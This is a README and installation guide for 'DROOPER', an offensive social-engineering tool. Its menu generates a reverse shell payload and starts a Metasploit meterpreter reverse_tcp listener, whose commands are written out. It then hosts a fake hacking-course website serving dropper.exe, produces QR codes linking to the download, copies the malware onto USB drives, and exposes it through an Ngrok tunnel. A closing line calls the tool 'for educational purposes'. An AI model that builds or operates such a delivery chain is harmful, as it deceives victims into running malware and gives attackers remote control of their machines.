DROOPER - Installation Guide
A Social Engineering Tool by AJVAD-N
Requirements

Before you begin, ensure you have the following installed on your system:

    Kali Linux (or any Linux system with Python 3)
    Python 3 (Check with python3 --version)
    Metasploit Framework (Check with msfconsole)
    Ngrok (If using tunneling)

Step 1: Clone the Repository

Open your terminal and run:

git clone https://github.com/your-repo/drooper.git
cd drooper

(Replace your-repo with the actual repository link if applicable.)
Step 2: Install Required Dependencies

Run the following command to install all dependencies:

pip install -r requirements.txt

If using Kali Linux, you might need to use:

pip install --break-system-packages -r requirements.txt

Step 3: Set Up Ngrok (Optional for External Access)

    Sign up at Ngrok
    Get your authtoken from Your Ngrok Dashboard
    Run this command to configure Ngrok:

    ngrok config add-authtoken YOUR_AUTHTOKEN

Step 4: Running DROOPER

Navigate to the project folder and run:

python3 drooper.py

You will see a menu like this:

1: Create Malware
2: Start Listener
3: Start Web Hosting Service
4: Generate Malware QR Code
5: Copy Malware to USB
6: Start Ngrok Tunnel
7: Exit

Step 5: Using DROOPER
1️⃣ Create Malware

Select option 1, and the tool will generate a reverse shell payload inside the DROOPER_OUTPUT folder.
2️⃣ Start the Metasploit Listener

Choose option 2 to start a Metasploit listener for the reverse shell.
3️⃣ Host a Fake Hacking Course Website

Select option 3 to start the web server, making the malware available for download.
4️⃣ Generate a QR Code for the Malware

Option 4 will generate a QR code linking to the malware download page.
5️⃣ Copy Malware to USB Drive

Select option 5 to copy the malware to an attached USB device.
6️⃣ Start Ngrok for External Access

Option 6 will start an Ngrok tunnel, making the hosted malware accessible from anywhere.
Step 6: Manual Testing

    To test the web hosting, visit:

http://localhost:8080/

To download the malware, visit:

    http://localhost:8080/download/dropper.exe

    If using Ngrok, visit the URL shown after running option 6.

Troubleshooting
1. Flask Server Not Running

    Ensure python3 is installed and try:

python3 drooper.py

Open another terminal and check for running processes:

    ps aux | grep flask

2. Ngrok Connection Issues

    Run:

ngrok http 8080

Ensure you’ve added your authtoken using:

    ngrok config add-authtoken YOUR_AUTHTOKEN

3. Metasploit Not Working

    Start Metasploit manually:

msfconsole

Load the listener manually:

    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST your_ip
    set LPORT 4444
    exploit

Uninstallation

To remove DROOPER, run:

rm -rf drooper

To remove installed dependencies:

pip uninstall -r requirements.txt -y

Final Notes

✅ Use responsibly – This tool is for educational purposes.
✅ Test everything before deploying.
✅ Stay ethical – Unauthorized use is illegal.

Need help? Contact AJVAD-N for support. 🚀
